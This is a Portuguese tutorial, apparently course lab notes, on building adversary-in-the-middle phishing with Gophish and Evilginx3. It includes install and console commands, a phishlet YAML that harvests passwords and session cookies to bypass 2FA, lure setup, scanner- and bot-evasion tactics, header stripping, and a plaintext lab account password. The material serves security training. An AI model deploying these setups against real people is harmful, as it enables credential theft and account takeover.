## 🛠️ Ferramentas Utilizadas

| Ferramenta | Função | Descrição |
| :--- | :--- | :--- |
| **Gophish** | Orquestrador | Gerencia o envio de e-mails, campanhas e rastreamento de alvos. | https://github.com/gophish/gophish |
| **Evilginx3** | Proxy Reverso | Atua como Man-in-the-Middle (MitM) para capturar cookies de sessão e bypassar 2FA. | https://github.com/kgretzky/evilginx2 | 
| **EviGolPhish** | Integrador | Automatiza a ponte entre os links do Evilginx3 e os templates do Gophish. | https://github.com/fin3ss3g0d/evilgophish |

---

# 🛰️ Fluxo de Dados: Ataque de Proxy Reverso (Man-in-the-Middle)

Este diagrama representa a movimentação de dados em tempo real. O Atacante (você) atua como um "espelho" inteligente no meio da comunicação.

---

## 🔄 Diagrama de Sequência de Dados

| Origem     | Direção | Destino      | Dado Transferido / Ação                       |
|:-----------|:-------:|:-------------|:----------------------------------------------|
| Vítima     |   -->   | Evilginx3    | Solicitação da página (via link de phishing)  |
| Evilginx3  |   -->   | Site Real    | Solicitação espelhada da página legítima      |
| Site Real  |   -->   | Evilginx3    | Envio da página de login real + Cabeçalhos    |
| Evilginx3  |   -->   | Vítima       | Renderização da página real (transparente)    |
| Vítima     |   -->   | Evilginx3    | **Usuário e Senha** (POST Data)               |
| Evilginx3  |   -->   | Site Real    | Repasse das credenciais para validação        |
| Vítima     |   -->   | Evilginx3    | **Código MFA** (SMS/App)                      |
| Evilginx3  |   -->   | Site Real    | Repasse do código 2FA                         |
| Site Real  |   -->   | Evilginx3    | **Session Cookie (Auth Token)** |
| **Atacante**|   <--   | Evilginx3    | **Exfiltração do Cookie para o Operador** |


## Instalacoes

### goPhish
- git clone https://github.com/gophish/gophish.git
- cd gophish
- go build
- sudo ./gophish 

### Evilginx3
- git clone https://github.com/kgretzky/evilginx2.git
- cd evilginx2
- make
- sudo ./build/evilginx -p ./phishlets -developer

  Dentro da consola interativa 
- config domain lab.example.com
- config ipv4 external <YOUR_VPS_IP>
- phishlets hostname o365 login.lab.example.com
- phishlets enable o365
- lures create o365
- lures get-url 0

### Evilgophish
- git clone https://github.com/fin3ss3g0d/evilgophish.git
- cd evilgophish
- sudo ./setup.sh lab.example.com https://legitimate-site.com true YOURID true


### **O que é um Phishlet?**

Um **phishlet** é uma configuração baseada em YAML que indica ao Evilginx2 como:

- Atuar como proxy de um site alvo
- Capturar credenciais de login
- Roubar cookies de sessão e tokens de autenticação
- Redirecionar o tráfego para um serviço legítimo de forma invisível

Os phishlets formam a base de todos os cenários de phishing do Evilginx2. Cada um é adaptado a um aplicativo específico (por exemplo, Google, WordPress, Amazon) e inclui lógica para gerenciamento de domínios, sequestro de sessão e coleta de credenciais.

---

### **Por que isso é importante**

Os phishlets permitem que invasores (ou membros de equipes de teste de segurança, em um contexto legal) **contornem a autenticação de dois fatores (2FA)** roubando o cookie de sessão após a vítima fazer login com sucesso no serviço real — sem perceber que algo malicioso está ocorrendo. Esse é um diferencial fundamental entre o Evilginx e ferramentas de phishing mais simples.

---
### Estrutura

```
# Example phishlet structure (simplified, educational)
name: 'example-target'
author: '@operator'
min_ver: '3.0.0'

proxy_hosts:
  - phish_sub: 'login'
    orig_sub: 'login'
    domain: 'target.com'
    session: true
    is_landing: true

  - phish_sub: 'www'
    orig_sub: 'www'
    domain: 'target.com'
    session: false

sub_filters:
  - triggers_on: 'login.target.com'
    orig_sub: 'login'
    domain: 'target.com'
    search: 'target.com'
    replace: 'lab.example.com'
    mimes: ['text/html', 'application/javascript', 'application/json']

auth_tokens:
  - domain: '.target.com'
    keys: ['session_id', 'auth_token']

credentials:
  username:
    key: 'login'
    search: '(.*)'
    type: 'post'
  password:
    key: 'passwd'
    search: '(.*)'
    type: 'post'

login:
  domain: 'login.target.com'
  path: '/authenticate'
```

### **Passo a passo: baixe e analise o Phishlet do WordPress.org**

### **1. Obtenha o Phishlet do WordPress.org**

Acesse este link:

> https://github.com/An0nUD4Y/Evilginx2-Phishlets/blob/master/wordpress.org.yaml

**Outros**
- https://www.patreon.com/posts/evilginx-3-2-2-97305954?l=es
- https://github.com/yudasm/WHfB-o365-Phishlet/blob/main/o365whfb.yaml
- https://github.com/hash3liZer/phishlets
- https://github.com/simplerhacking/Evilginx3-Phishlets

Clique em **“Raw”** e, em seguida, copie todo o conteúdo YAML.

---


### **2. Salvar o Phishlet localmente**

No terminal do Kali Linux:

mkdir -p ~/hands-on-phishing/phishlets cd ~/hands-on-phishing/phishlets nano wordpress.org.yaml

Cole o conteúdo com `Ctrl + Shift + V` e, em seguida:

- Salve e saia com: `Ctrl + X`, depois `Y` e, por fim, `Enter`

---

### **3. (Opcional) Abra na GUI para facilitar a revisão**

mousepad wordpress.org.yaml

Use qualquer editor GUI de sua preferência (`gedit`, `VS Code`, etc.).

---

### **Análise da estrutura do phishlet**

Veja o que procurar no arquivo `wordpress.org.yaml`:

> Este phishlet tem como alvo o domínio oficial wordpress.org. Ele não funcionará imediatamente em sites WordPress auto-hospedados, como hacksmarter-manufacturing.shop. É necessária personalização.
>


# **Configurando seu primeiro Phishlet**

### **Parte 1: Atualizar registros DNS para subdomínios do Phishlet**

O Phishlet do WordPress.org requer vários subdomínios para funcionar corretamente:

- `login.seudominio.com`
- `make.seudominio.com`
- `profiles.seudominio.com`

### **Passos (usando o Namecheap):**

1. Faça login na sua conta do Namecheap.
2. Vá para **Lista de domínios** → clique em **Gerenciar** no seu domínio.
3. Navegue até a guia **DNS avançado**.
4. Adicione três novos **Registros A**:
- 
    - **Tipo**: Registro A
    - **Host**: `login`, `make` e `profiles` (um por registro)
    - **Valor**: O IP público do seu VPS (por exemplo, `147.182.215.174`)
    - **TTL**: 1 minuto
1. Clique no **✓** verde para salvar cada um.
2. Aguarde cerca de 5 minutos para a propagação do DNS.

---

### **Parte 2: Adicione o Phishlet ao Evilginx**

- Conecte-se via SSH ao seu Droplet da Digital Ocean:

ssh root@[seu_ip]

- Navegue até o diretório `phishlets/`:

cd ~/evilginx/phishlets

- Abra um novo arquivo YAML e cole o conteúdo do phishlet do WordPress:

nano wordpress.org.yaml

- Cole o phishlet (copiado do GitHub ou de uma fonte local).
- Salve e saia (`Ctrl + X`, depois `Y`, depois `Enter`).

---
### **Parte 3: Ativar o Phishlet no Evilginx**

- Reinicie o Evilginx2 para carregar o novo phishlet:

./evilginx

- No shell do Evilginx2:

phishlets # Confirme se ele aparece na lista phishlets hide example # Ocultar o exemplo padrão

- Defina o nome do host (use seu domínio):

phishlets hostname wordpress.org yourdomain.com

- Ative o phishlet:

phishlets enable wordpress.org

> Certificados TLS serão solicitados automaticamente para todos os subdomínios necessários. Isso pode levar até 60 segundos.
> 

---

### **Parte 4: Criar e testar a isca**

- Crie uma isca:

lures create wordpress.org

- Obtenha a URL da isca:

lures get-url 0

1. Abra a URL no Firefox. Você deverá ver a página de login do WordPress.org, servida a partir do seu subdomínio malicioso (por exemplo, `login.yourdomain.com`).

---

### **Parte 5: Simule o login de uma vítima**

Use credenciais fictícias:

- Nome de usuário: `admin`
- Senha: `password123`

Envie o formulário de login.

- No Evilginx, verifique os dados capturados:

sessions

Você deve ver agora:

- Nome de usuário da vítima
- Senha
- Tokens de sessão (se o login for bem-sucedido)
- IP de origem e carimbo de data/hora

> ⚠️ Se bots estiverem acessando sua instância do Evilginx2, você poderá ver muitas solicitações com falha — o Evilginx coloca automaticamente na lista negra o tráfego que não seja de isca. Isso diminuirá após 5 a 10 minutos.
>


# **Criar um Phishlet personalizado para WordPress auto-hospedado**

### **Visão geral da solução**

Uma versão funcional do phishlet personalizado está disponível aqui:

[hacksmarter.yaml no GitHub](https://github.com/TeneBrae93/phishing/blob/main/hacksmarter.yaml)

Recomendamos que você faça um fork do repositório, estude o YAML e reutilize essa estrutura para outros alvos de WordPress auto-hospedados.

---

### **Instruções passo a passo para implantação**

### **1. Copie e salve o Phishlet**

No seu Droplet do Digital Ocean:

cd ~/evilginx/phishlets nano hacksmarter.yaml

Cole o conteúdo do arquivo do GitHub e salve com:

`Ctrl + X`, depois `Y`, depois `Enter`.

---

### **2. Inicie o Evilginx**

cd ~/evilginx ./evilginx

---

### **3. Desative quaisquer Phishlets existentes**

phishlets disable wordpress.org phishlets hide wordpress.org

---

### **4. Ative o Phishlet personalizado**

phishlets hostname hacksmarter login.hacksmarter-manufacturing.cam phishlets enable hacksmarter

O Evilginx solicitará certificados TLS e preparará o ambiente de proxy.

---

### **5. Crie a isca**

lures create hacksmarter lures get-url 1 # Substitua pelo ID real da isca, se for diferente

Abra a URL em um navegador. Você deverá ver a **página de login real**, redirecionada de forma invisível pelo Evilginx.

---

### **Da perspectiva da vítima**

Quando um alvo (por exemplo, o usuário *Tony*) faz login usando a isca de phishing:

- Ele é redirecionado para o painel de controle real do WordPress.
- Seu **nome de usuário** e **senha** são capturados.
- O Evilginx2 também pode capturar **tokens de sessão**, dependendo da configuração.

---

## **Credenciais do WordPress**

Não altere a senha do usuário, não atualize seu perfil nem execute nenhuma ação, exceto para fazer login e testar. Se você modificar o usuário, será banido de todos os meus cursos futuros.

`Nome de usuário: tony Senha: dafadfgadfgf353434!~#!@DDFG"{"{"!`
- Seu **nome de usuário** e **senha** são capturados.
- O Evilginx2 também pode capturar **tokens de sessão**, dependendo da configuração.

## Lures
As criações de lures no Evilginx são os links de phishing personalizados que você envia para as vítimas durante um engajamento . Eles são o principal vetor de entrega do ataque, funcionando como a "isca" que leva o alvo ao site falso.

Pense no phishlet como o molde que diz ao Evilginx como imitar um site específico (ex: LinkedIn, Microsoft). O lure é a instância concreta desse molde, gerando um link único e permitindo que você ajuste inúmeros detalhes da campanha para cada alvo ou grupo

Ao criar um lure com o comando lures create <nome_do_phishlet>, você recebe um ID numérico para gerenciá-lo. A partir daí, as principais opções de personalização são :

Personalização da Aparência do Link: Você pode editar o nome do host (hostname) e o caminho (path) da URL para torná-la mais atraente. Por exemplo, pode transformar https://www.linkedin.seu-dominio-falso.com/PlXFBIrM em https://www.linkedin.seu-dominio-falso.com/downloads/Relatorio_Salarios.pdf .

Controle de Acesso e Filtros: É possível definir um filtro de User-Agent com expressões regulares para aceitar apenas visitas de tipos específicos de dispositivos (ex: somente Mobile) e adicionar uma camada de proteção contra análise por bots de segurança .

Páginas de Redirecionamento Intermediárias (Redirectors): Você pode configurar uma pequena página HTML (um redirector) que será mostrada antes do usuário ser enviado à página de login falsa. Essa página pode conter um botão ou redirecionar automaticamente, simulando, por exemplo, um aviso de "Clique aqui para ver seu documento" .

Pré-visualização de Links (OpenGraph): Para enganar até mesmo os mais atentos, você pode configurar os metadados OpenGraph (título, descrição, imagem) que aparecem na pré-visualização do link quando compartilhado em redes sociais ou aplicativos de mensagem .

Geração de Links Personalizados e Únicos: O Evilginx permite gerar links únicos para cada alvo, incorporando dados como nome e e-mail de forma criptografada diretamente na URL. Isso pode ser feito um a um ou em massa, importando uma lista de alvos em formato CSV ou JSON. Esta é uma tática crucial para evitar a detecção, pois cada link funciona apenas uma vez, frustrando scanners de segurança que tentam acessar o link repetidamente .

Configuração de Comportamento Pós-captura: Após a vítima fazer login e o Evilginx capturar as credenciais e cookies de sessão, você pode definir para onde ela será redirecionada (redirect_url), como um documento legítimo no Google Drive, para não levantar suspeitas .

Fluxo de um Ataque com Lures
Configuração Inicial: O atacante configura um domínio malicioso (ex: seguranca-interna.com) e o associa ao servidor com Evilginx.

Criação do Phishlet: Um phishlet para o alvo (ex: LinkedIn) é carregado e configurado .

Criação do Lure: O atacante cria um lure baseado no phishlet do LinkedIn e o personaliza: define um caminho de URL como /rh/vagas, configura uma prévia atraente e ativa o filtro de User-Agent .

Geração do Link: Um link único como https://linkedin.seguranca-interna.com/rh/vagas?token=XPTO é gerado e enviado para a vítima .

Interação da Vítima: A vítima clica no link, vê a prévia atraente e a página de login idêntica à do LinkedIn. Ela insere suas credenciais e, se aplicável, o código de MFA.

Captura de Dados: O Evilginx captura tudo (credenciais, cookies de sessão) em tempo real e, em seguida, redireciona a vítima para uma página inofensiva .

Acesso Indevido: O atacante usa os cookies de sessão capturados para acessar a conta legítima da vítima no LinkedIn, sem precisar de senha ou MFA



## odificacoes OPSEC
**Remocao de header no gophish**
- X-Mailer: gophish
- X-Gophish-Contact
- Random URL path
